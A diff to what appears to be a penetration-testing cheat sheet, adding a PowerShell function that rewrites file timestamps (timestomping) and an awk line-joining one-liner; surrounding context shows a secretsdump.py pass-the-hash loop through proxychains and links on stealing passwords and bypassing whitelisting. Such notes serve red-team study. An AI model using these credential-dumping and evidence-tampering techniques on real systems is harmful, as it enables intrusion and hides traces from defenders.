@@ -1190,6 +1190,23 @@ http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-loca
 ### Create custom DLL for password filters and install on DC to capture changed passwords  
 * http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
 
+#### Set File Timestamps
+```
+Function Set-FileTimeStamps
+{
+ Param (
+    [Parameter(mandatory=$true)]
+    [string[]]$path,
+    [datetime]$date = (Get-Date))
+    Get-ChildItem -Path $path |
+
+    ForEach-Object {
+     $_.CreationTime = $date
+     $_.LastAccessTime = $date
+     $_.LastWriteTime = $date }
+} #end function Set-FileTimeStamps
+```
+
 ## Application Whitelisting Bypass Techniques
 
 [SubTee Collection of Whitelist Bypass Techniques ](https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt)
@@ -2136,6 +2153,12 @@ BASH loop example
 		echo -n "[*] user: $u" && \
 		proxychains python /usr/local/bin/secretsdump.py domain/username@$u -hashes aad3b435b51404eeaad3b435b51404ee:0e493911f561a425e7a905329f4454bf |tee user_brute.log
 	done
+```
+
+
+Remove new line following ":"
+```
+    awk '/:/ {printf("%s", $0); next}1' file.txt
 ```
 
 BASH .bashrc Function Example
